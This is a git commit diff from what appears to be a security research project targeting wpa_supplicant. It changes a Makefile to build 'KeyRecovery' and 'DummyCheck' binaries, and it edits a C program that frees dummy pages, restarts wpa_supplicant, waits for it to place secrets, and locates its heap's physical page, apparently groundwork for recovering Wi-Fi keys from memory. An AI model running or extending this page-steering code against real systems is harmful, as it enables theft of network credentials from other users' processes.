b4e963c161f0bddc400066d9ba714c89f8ae1faf
tkt-ino <100588602+tkt-ino@users.noreply.github.com>
2024-03-08 22:40:43 +0900

    add c file

--- Makefile
+++ Makefile
@@ -1,5 +1,3 @@
-TARGET   = uaf
-OBJS     = dummy_check.o
 CC       = gcc
 FLAGS    = -luring
 LIB      = $(shell pwd)/wpa/target/debug/libwpa.a
@@ -7,16 +5,19 @@ RUST_SRC = $(shell pwd)/wpa/src/*.rs
 
 .PHONY: all clean distclean
 
-all: $(TARGET)
+all: KeyRecovery DummyCheck
 
-$(TARGET): $(OBJS) $(LIB)
-	$(CC) -o $(TARGET) $^ $(FLAGS)
+KeyRecovery: key_recovery.o $(LIB)
+	$(CC) -o $@ $^ $(FLAGS)
+
+DummyCheck: dummy_check.o $(LIB)
+	$(CC) -o $@ $^ $(FLAGS)
 
 $(LIB): $(RUST_SRC)
 	cd wpa && cargo build
 
 clean:
-	$(RM) $(OBJS)
+	$(RM) *.o
 
 distclean: clean
-	$(RM) $(TARGET)
+	$(RM) KeyRecovery DummyCheck
--- dummy_check.c
+++ dummy_check.c
@@ -1,12 +1,11 @@
-#include "dummy_check.h"
+#include "wpa.h"
 #include <stdio.h>
 #include <sched.h>
 #include <fcntl.h>
 #include <unistd.h>
-#include <sys/mman.h>
 #include <stdlib.h>
 
-static const int DUMMY_PAGE = 189;
+static const int DUMMY_PAGE = 300;
 static const int BUSY_LOOP = 5;
 static const int PFN_MASK_SIZE = 8;
 
@@ -18,16 +17,6 @@ int main() {
         if (dummy_pages[i].virt_addr == MAP_FAILED) continue;
         dummy_pages[i].phys_addr = v2p(0, dummy_pages[i].virt_addr);
     }
-
-    // ターゲットページを確保
-    dummy target_1;
-    dummy target_2;
-
-    target_1.virt_addr = custom_mmap();
-    target_1.phys_addr = v2p(0, target_1.virt_addr);
-    
-    target_2.virt_addr = custom_mmap();
-    target_1.phys_addr = v2p(0, target_2.virt_addr);
 
     // wpa_supplicant が起動中なら一度止める
     int res = 0;
@@ -44,10 +33,6 @@ int main() {
         sched_yield();
     }
 
-    // ターゲットページ解放
-    munmap(target_1.virt_addr, 0x1000);
-    munmap(target_2.virt_addr, 0x1000);
-
     // ダミーページ解放
     for (int i = 0; i < DUMMY_PAGE; i++) {
         munmap(dummy_pages[i].virt_addr, 0x1000);
@@ -60,12 +45,12 @@ int main() {
     }
     printf("[+] start wpa_supplicant\n");
 
-    // wpa_supplicant が秘密情報を配置するまで待機
-    busy_loop(BUSY_LOOP);
-
     // wpa_supplicant のプロセスID取得
     int pid = get_process_id();
     printf("[+] pid = %d\n", pid);
+
+    // wpa_supplicant が秘密情報を配置するまで待機
+    busy_loop(BUSY_LOOP);
 
     // wpa_supplicant プロセスの heap 領域のアドレスを取得
     uint64_t heap_addr = get_heap_start_address(pid);
@@ -76,33 +61,13 @@ int main() {
     printf("[+] physical address = 0x%lx\n", phys_addr);
 
     // ダミーページ計算
-    // for (int index = 0; index < DUMMY_PAGE; index++) {
-    //     if (dummy_pages[index].phys_addr == phys_addr) {
-    //         printf("[+] index = %d, dummy page is %d\n", index, DUMMY_PAGE - index - 1);
-    //         break;
-    //     }
-    // }
-    
-    // ページの誘導に成功したか確認
-    if (phys_addr == target_1.phys_addr) {
-        printf("[+] successfully lead to the target page1\n");
-    } else if (phys_addr == target_2.phys_addr) {
-        printf("[+] successfully lead to the target page2\n");
-    } else {
-        printf("[-] failed lead to the target page\n");
+    for (int index = 0; index < DUMMY_PAGE; index++) {
+        if (dummy_pages[index].phys_addr == phys_addr) {
+            printf("[+] dummy page is %d\n", DUMMY_PAGE - index - 1);
+            break;
+        }
     }
-
+    
     return 0;
 }
 
-void *custom_mmap() {
-    void *addr = mmap(
-        NULL,
-        0x1000,
-        PROT_READ | PROT_WRITE,
-        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
-        -1,
-        0
-    );
-    return addr;
-}
